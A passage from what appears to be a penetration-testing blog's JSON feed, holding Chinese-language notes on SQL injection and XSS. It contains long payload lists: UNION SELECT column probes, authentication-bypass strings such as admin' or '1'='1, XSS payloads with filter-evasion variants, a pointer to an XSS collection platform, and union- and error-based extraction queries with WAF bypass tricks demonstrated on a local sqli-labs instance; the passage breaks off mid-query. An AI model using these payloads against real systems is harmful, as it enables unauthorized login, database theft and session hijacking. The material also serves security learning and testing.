UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX'#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n</code></pre>\n<h2 id=\"sql-injection-auth-bypass-payloads\"><a class=\"anchor\" href=\"#sql-injection-auth-bypass-payloads\">#</a> SQL Injection Auth Bypass Payloads</h2>\n<pre><code>'-'\n' '\n'&amp;'\n'^'\n'*'\n' or ''-'\n' or '' '\n' or ''&amp;'\n' or ''^'\n' or ''*'\n&quot;-&quot;\n&quot; &quot;\n&quot;&amp;&quot;\n&quot;^&quot;\n&quot;*&quot;\n&quot; or &quot;&quot;-&quot;\n&quot; or &quot;&quot; &quot;\n&quot; or &quot;&quot;&amp;&quot;\n&quot; or &quot;&quot;^&quot;\n&quot; or &quot;&quot;*&quot;\nor true--\n&quot; or true--\n' or true--\n&quot;) or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n&quot; or &quot;x&quot;=&quot;x\n&quot;) or (&quot;x&quot;)=(&quot;x\n&quot;)) or ((&quot;x&quot;))=((&quot;x\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' #\nadmin'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin' or 1=1#\nadmin' or 1=1/*\nadmin') or ('1'='1\nadmin') or ('1'='1'--\nadmin') or ('1'='1'#\nadmin') or ('1'='1'/*\nadmin') or '1'='1\nadmin') or '1'='1'--\nadmin') or '1'='1'#\nadmin') or '1'='1'/*\n1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\nadmin&quot; --\nadmin&quot; #\nadmin&quot;/*\nadmin&quot; or &quot;1&quot;=&quot;1\nadmin&quot; or &quot;1&quot;=&quot;1&quot;--\nadmin&quot; or &quot;1&quot;=&quot;1&quot;#\nadmin&quot; or &quot;1&quot;=&quot;1&quot;/*\nadmin&quot;or 1=1 or &quot;&quot;=&quot;\nadmin&quot; or 1=1\nadmin&quot; or 1=1--\nadmin&quot; or 1=1#\nadmin&quot; or 1=1/*\nadmin&quot;) or (&quot;1&quot;=&quot;1\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;--\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;#\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;/*\nadmin&quot;) or &quot;1&quot;=&quot;1\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;--\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;#\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;/*\n1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055\n</code></pre>\n<h2 id=\"references\"><a class=\"anchor\" href=\"#references\">#</a> References :</h2>\n<ul>\n<li>SQL Injection ( OWASP )</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9u\">https://www.owasp.org/index.php/SQL_Injection</span></p>\n<ul>\n<li>Blind SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9CbGluZF9TUUxfSW5qZWN0aW9u\">https://www.owasp.org/index.php/Blind_SQL_Injection</span></p>\n<ul>\n<li>Testing for SQL Injection (OTG-INPVAL-005)</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9TUUxfSW5qZWN0aW9uXyhPVEctSU5QVkFMLTAwNSk=\">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)</span></p>\n<ul>\n<li>SQL Injection Bypassing WAF</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9uX0J5cGFzc2luZ19XQUY=\">https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF</span></p>\n<ul>\n<li>Reviewing Code for SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9SZXZpZXdpbmdfQ29kZV9mb3JfU1FMX0luamVjdGlvbg==\">https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection</span></p>\n<ul>\n<li>PL/SQL:SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QTC9TUUw6U1FMX0luamVjdGlvbg==\">https://www.owasp.org/index.php/PL/SQL:SQL_Injection</span></p>\n<ul>\n<li>Testing for NoSQL injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9Ob1NRTF9pbmplY3Rpb24=\">https://www.owasp.org/index.php/Testing_for_NoSQL_injection</span></p>\n<ul>\n<li>SQL Injection Injection Prevention Cheat Sheet</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9JbmplY3Rpb25fUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1s\">https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html</span></p>\n<ul>\n<li>SQL Injection Query Parameterization Cheat Sheet</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9RdWVyeV9QYXJhbWV0ZXJpemF0aW9uX0NoZWF0X1NoZWV0Lmh0bWw=\">https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html</span></p>\n",
            "tags": [
                "sql注入",
                "payload"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6XSS/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6XSS/",
            "title": "初学XSS",
            "date_published": "2020-12-09T02:18:02.000Z",
            "content_html": "<h1 id=\"xss简介\"><a class=\"anchor\" href=\"#xss简介\">#</a> XSS 简介</h1>\n<p>XSS 攻击指黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击。</p>\n<p>XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当受害者在 Web 浏览器中打开该 URL 的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p>\n<p>XSS 跨站脚本攻击漏洞也是 OWASP Top 10 中经常出现的对象，造成 XSS 漏洞普遍流行的原因如下:</p>\n<ol>\n<li>Web 浏览器本身的设计不安全，无法判断 JS 代码是否是恶意的</li>\n<li>输入与输出的 Web 应用程序基本交互防护不够</li>\n<li>程序员缺乏安全意识，缺少对 XSS 漏洞的认知</li>\n<li>XSS 触发简单，完全防御起来相当困难</li>\n</ol>\n<h1 id=\"小知识\"><a class=\"anchor\" href=\"#小知识\">#</a> 小知识</h1>\n<ol>\n<li>XSS 的存在，一定是伴随着输入，与输出 2 个概念的。</li>\n<li>要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。</li>\n<li>如果输入和输出都没过滤。那么漏洞将是显而易见的。</li>\n</ol>\n<hr />\n<p>css 里，允许使用转义字符，\\+ascii16 进制形式。这样一来，我们就可以构造利用语句啦。</p>\n<hr />\n<p>在 HTML 属性中，会自动对实体字符进行转义。一个简单的比方。<br />\n&lt;imgsrc=&quot;1&quot;onerror=&quot;alert(1)&quot;&gt;<br />\n 和<br />\n &lt;imgsrc=&quot;1&quot;onerror=&quot;alert (1)&quot;&gt;<br />\n 是等效的</p>\n<hr />\n<h1 id=\"常见的payload\"><a class=\"anchor\" href=\"#常见的payload\">#</a> 常见的 payload</h1>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">\">&lt;script>alert(1)&lt;/script>&lt;\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token string\">'>&lt;script>alert(1)&lt;/script>&lt;'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token string\">\">&lt;script>alert(1)&lt;/script>&lt;\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token string\">\">&lt;ScrIPt>alert(1)&lt;/scriPt>&lt;\"</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token string\">\">&lt;ScrIPt>alert(1)&lt;/scriPt>&lt;\"</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token string\">\">&lt;scriscriptpt>alert(1)&lt;/scscriptriPt>&lt;\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token string\">\">&lt;scriscriptpt>alert(1)&lt;/scscriptriPt>&lt;\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token string\">\">&lt;Script>alert(1)&lt;/Script>&lt;\"</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token string\">\">&lt;img src=x ONerror=alert(1)>&lt;\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token string\">\">&lt;a onclick=alert(1)>click me&lt;/a>&lt;\"</span>  <span class=\"token comment\">// 不过这个需要点击一下才能 xss，危害没有自动 xss 效果好</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token string\">\">&lt;a href=\"</span>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token string\">\">click me&lt;/a>&lt;\"</span>   <span class=\"token comment\">// 这里 href 里使用 javascript 伪协议声明后面的是 js 代码</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token string\">\">&lt;body onload=alert(1)>&lt;\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token string\">\">&lt;div onclick=\"</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xss'</span><span class=\"token punctuation\">)</span><span class=\"token string\">\">click me&lt;\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token string\">\">&lt;body onload=alert`1`>&lt;\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// 有时候用斜杠是可以代替空格的</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token string\">\">&lt;img/src='1'/onerror=alert`0`>&lt;\"</span> </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token string\">\">&lt;&lt;svg/onload=alert`1`>&lt;\"</span>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">//input 是有一个比较奇葩的 payload 的，那就是 </span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span>image src<span class=\"token operator\">=</span>x onerror<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">// 这个 payload 会把 input 当做 img 标签来用</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">// 对单双引号进行了替换，替换为了对应的实体编码</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// 然后判断了用户提交的 url 中是否含有 http://</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">// 用来验证提交的是否为 url</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">// 这里可以用 </span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//http://</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">// 因为 javascript 中，// 是代表注释的意思</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">// 这样数据中含有 http:// 还不影响弹窗</span></pre></td></tr></table></figure><h1 id=\"xss平台\"><a class=\"anchor\" href=\"#xss平台\">#</a> XSS 平台</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94cy5zYi94c3MucGhw\">https://xs.sb/xss.php</span></p>\n<p>这个挺不错的。</p>\n",
            "tags": [
                "xss"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/",
            "title": "再学SQLinjection",
            "date_published": "2020-12-07T03:27:26.000Z",
            "content_html": "<p><img data-src=\"/images/bimg/%E9%98%BF%E5%B0%94%E7%93%A6%E6%8B%89%E8%BE%9B%EF%BC%8C%E8%A5%BF%E7%8F%AD%E7%89%99.jpg\" alt=\"\" /></p>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>接着深入学习 SQL 注入。本文源自某位前辈的笔记，author：404</p>\n</blockquote>\n<h1 id=\"0x00-注入的产生\"><a class=\"anchor\" href=\"#0x00-注入的产生\">#</a> 0x00 注入的产生</h1>\n<ol>\n<li>\n<p>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</p>\n</li>\n<li>\n<p>过滤不严格。</p>\n</li>\n<li>\n<p>数据库配置不当。</p>\n</li>\n<li>\n<p>转义不当。</p>\n</li>\n</ol>\n<h1 id=\"0x01-注入的类型\"><a class=\"anchor\" href=\"#0x01-注入的类型\">#</a> 0x01 注入的类型</h1>\n<p>常见的注入我们可以归纳为数字型，字符型，搜索型，盲注等。</p>\n<pre><code>select * from admin where id = $id; //数字型 注入\n\nselect * from admin where id = '$id'; //字符型\n\nselect * from admin where id = &quot;$id&quot;;\n\nselect * from admin where id = ($id);\n\nselect * from admin where id = ('$id');\n\nselect * from admin where id = (&quot;$id&quot;);\n\nselect * from admin where username  like '%adm%';\n\nselect * from admin where username  like ('%adm%');\n\nselect * from admin where id = $id limit 0,1;\n\nselect * from admin order by $id;\n\nselect * from admin order by limit 0,1 $id;\n\nselect * from admin order by id limit 1,1 $id;\n\ninsert注入\n\nupdate注入\n\ndelete注入\n\n二次注入\n\n等等\n\n</code></pre>\n<p>实际环境中我们可能还会遇到更为复杂的 sql 注入语句，我们就要想办法闭合它。</p>\n<h1 id=\"0x03-寻找注入的一些注意\"><a class=\"anchor\" href=\"#0x03-寻找注入的一些注意\">#</a> 0x03 寻找注入的一些注意</h1>\n<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的 fuzz 上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入，<br />\n但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>\n<ol>\n<li>\n<p>当网站为成熟的 cms 框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</p>\n</li>\n<li>\n<p>判断为自己开发的系统，目标不是很重要可以尝试使用 AWVS 等工具。</p>\n</li>\n<li>\n<p>信息收集的重要性，可能它的源码就在 GitHub 上，或者一个备份文件。</p>\n</li>\n</ol>\n<h1 id=\"0x00-数据库版本收集与路径\"><a class=\"anchor\" href=\"#0x00-数据库版本收集与路径\">#</a> 0x00 数据库版本收集与路径</h1>\n<p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到  <code>version()</code>   <code>@@version</code>   <code>/*!版本号*/</code></p>\n<p><code>/*!*/</code>  意为在 xxx 版本之上执行 我的版本是 5.6 所以可以执行</p>\n<pre><code>mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,version(),3;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | admin    | admin    |\n|    1 | 5.6.30-1 | 3        |\n+------+----------+----------+\n2 rows in set (0.00 sec)\n\nmysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,@@version,3;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | admin    | admin    |\n|    1 | 5.6.30-1 | 3        |\n+------+----------+----------+\n2 rows in set (0.01 sec)\n\nmysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,/*!40000 user()*/,3;\n+------+----------------+----------+\n| id   | username       | password |\n+------+----------------+----------+\n|    1 | admin          | admin    |\n|    1 | root@localhost | 3        |\n+------+----------------+----------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<p>路径的话一般用 <code>@@datadir</code>  就可以了然后大概反猜下网站路径 操作系统  <code>@@version_compile_os</code></p>\n<h1 id=\"0x01-用户链接信息\"><a class=\"anchor\" href=\"#0x01-用户链接信息\">#</a> 0x01 用户，链接信息</h1>\n<p><code>system_user()</code>  // 系统用户名<br />\n <code>user()</code>  // 用户名<br />\n <code>current_user()</code>  // 当前用户名<br />\n <code>session_user()</code>  // 链接数据库的用户名</p>\n<pre><code>mysql&gt; select * from users where id =1 union select system_user(),session_user(),current_user();\n+--------------------+--------------------+----------+\n| id                 | username           | password |\n+--------------------+--------------------+----------+\n| 1                  | Dumb               | Dumb     |\n| root@192.168.1.101 | root@192.168.1.101 | root@%   |\n+--------------------+--------------------+----------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<p>读取 host 与 user</p>\n<pre><code>mysql&gt; select * from users where id =1 union select 1,host,user from mysql.user;\n+----+-----------+----------+\n| id | username  | password |\n+----+-----------+----------+\n|  1 | Dumb      | Dumb     |\n|  1 | %         | root     |\n|  1 | 127.0.0.1 | root     |\n|  1 | ::1       | root     |\n|  1 | localhost | root     |\n+----+-----------+----------+\n5 rows in set (0.00 sec)\n\n</code></pre>\n<h1 id=\"0x02-文末\"><a class=\"anchor\" href=\"#0x02-文末\">#</a> 0x02 文末</h1>\n<p>通过以上信息还能大概判断下是不是站库分离之类的</p>\n<h1 id=\"0x00-初识注入-bypass\"><a class=\"anchor\" href=\"#0x00-初识注入-bypass\">#</a> 0x00 初识注入 bypass</h1>\n<p>在 MySQL 里面注入和搭建环境来其实差不多，推荐使用 sqli-labs 来练练手，网上一堆的方法也是我们从学以来用到的</p>\n<p>加引号 报错  <code>and 1=1</code>   <code>and 1=2</code>  然后 SQLmap 一丢有 waf 就凉凉，可能 and 的时候就凉了，所以手工是也算个必修课吧。</p>\n<p>直接用  <code>and 1=1</code>  一类的多属于 数字型注入  <code>select * from admin where id = $id;</code>  被包裹起来的就不行的，所以<br />\n一般要看报错的语句，当然也不是加个引号没报错就没了，具体分很多情况的。（废话多了点顺便讲清楚吧）</p>\n<h1 id=\"0x01-第一个注入\"><a class=\"anchor\" href=\"#0x01-第一个注入\">#</a> 0x01 第一个注入</h1>\n<p>and 是一个逻辑符号 要求两边同时成立，所以 and 这边是什么可以尽情发挥大家的才能 比如 and true=1 ？，为什么要这么写，因为某狗判断的就是 and 这边的字符类型<br />\n大家可以去了解了解 MySQL 隐式转化。</p>\n<pre><code>mysql&gt; select * from users where id = &quot;1&quot; and 1=1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users where id = &quot;1&quot; and 1=2;\nEmpty set (0.00 sec)\n\n</code></pre>\n<p>说了这么多我们就拿 sqli-labs 的第一关来演示一下</p>\n<p><img data-src=\"1.6.1.png\" alt=\"mysql\" /></p>\n<p>看到报错语句</p>\n<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1\n\n</code></pre>\n<p>其中 <code>''1'' LIMIT 0,1'</code>  最外层的是它出错给你的字符串不用看，所以为 <code>'1'' LIMIT 0,1</code>  应为我们的单引号没闭合所以造成了出错 同时知道了 它的后面有个  <code>LIMIT 0,1</code>  所以反推大概的语句为  <code>select x,x from xxx where x='id' limit 0,1</code>  看到报错信息我们应该要能反推它的语句，有利于我们进一步注入，下面使用联合注入。</p>\n<p>首先都是老套路  <code>order by xx</code>  来判断它的列数，因为  <code>order by</code>  是根据列来排序的 （排序第几列）</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,schema_name,3 from information_schema.schemata limit 2,1 -- +\n\n</code></pre>\n<p>通过 limit 0,1 来控制前端的显位的数据 (从第 0 条取一条) 如果是过滤逗号 。 想用分页可以使用  <code>1 offset 1</code>  意思是从第 1 条开始选一条当然还有 join 分页这些都在后面讲了。</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- +\n</code></pre>\n<p>当然你想直接爆当前的库的表 不妨这样写  <code>table_schema=database()</code>  为了避免单引号你也可以使用 hex 后的数据  <code>table_schema=0x7365637572697479</code></p>\n<p>使用 <code>group_concat()</code>  函数把表名都聚合起来，更加方便。</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 -- +\n</code></pre>\n<p>爆出字段</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(username,0x7C,password),3 from users-- +\n\n</code></pre>\n<p>爆出数据 在  <code>group_concat()</code>  被过滤的情况下我们可以使用其他的来替换 推荐大家查阅 mysql 函数表</p>\n<p>当我们使用  <code>information_schema.schemata</code>  时被拦截了，我们可以这样绕过</p>\n<pre><code>\n`information_schema`.`schemata `\ninformation_schema/**/.schemata\ninformation_schema/*!*/.schemata\ninformation_schema%0a.schemata\n\n</code></pre>\n<p>也有人遇到过这种情况 users 表被拦截 怎么绕过呢，其实也一样</p>\n<pre><code>security.users 数据库名 加表名\n\nsecurity.`users`\n\n</code></pre>\n<h1 id=\"0x00-报错注入\"><a class=\"anchor\" href=\"#0x00-报错注入\">#</a> 0x00 报错注入</h1>\n<p>报错注入在我们不能联合注入的时候也是非常重要的网上给我们提供了很多中报错注入 这里直接引用<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd29jYWxpZXNoZW5tZWd1aS9wLzU5MTc5NjcuaHRtbA==\"> https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</span> 一文了</p>\n<pre><code>1.floor()\n\nselect * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n\n2.extractvalue()\n\nselect * from test where id=1 and (extractvalue(1,concat(0x7e,(select 